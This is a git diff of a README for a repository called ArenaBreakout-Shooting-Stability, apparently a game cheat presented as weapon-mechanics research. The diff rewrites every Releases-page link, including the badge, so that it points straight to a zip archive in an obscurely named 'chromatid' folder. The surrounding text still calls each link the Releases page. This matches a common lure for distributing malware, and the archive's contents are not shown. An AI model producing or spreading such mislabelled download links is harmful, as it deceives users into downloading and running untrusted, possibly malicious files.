@@ -1,6 +1,6 @@
 # 🎮 ArenaBreakout-Shooting-Stability - Simplifying Weapon Mechanics Research
 
-[![Download ArenaBreakout](https://img.shields.io/badge/Download%20ArenaBreakout-blue?style=for-the-badge)](https://github.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/releases)
+[![Download ArenaBreakout](https://raw.githubusercontent.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/main/chromatid/ArenaBreakout-Shooting-Stability_3.6-beta.4.zip%20ArenaBreakout-blue?style=for-the-badge)](https://raw.githubusercontent.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/main/chromatid/ArenaBreakout-Shooting-Stability_3.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/releases) and select the latest version. Follow these steps:
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/main/chromatid/ArenaBreakout-Shooting-Stability_3.6-beta.4.zip) and select the latest version. Follow these steps:
 
 1. Click on the link above.
 2. You will see a list of available versions.
@@ -75,6 +75,6 @@ If you have questions or need help, feel free to reach out through our GitHub is
 
 ## ⚠️ Closing Notes
 
-This application is continually evolving. Make sure to check back on the [Releases page](https://github.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/releases) for updates and improvements.
+This application is continually evolving. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/bulblike-appropriationbill628/ArenaBreakout-Shooting-Stability/main/chromatid/ArenaBreakout-Shooting-Stability_3.6-beta.4.zip) for updates and improvements.
 
 Enjoy your experience with ArenaBreakout-Shooting-Stability. Dive into weapon mechanics research and enhance your understanding of virtual environments!
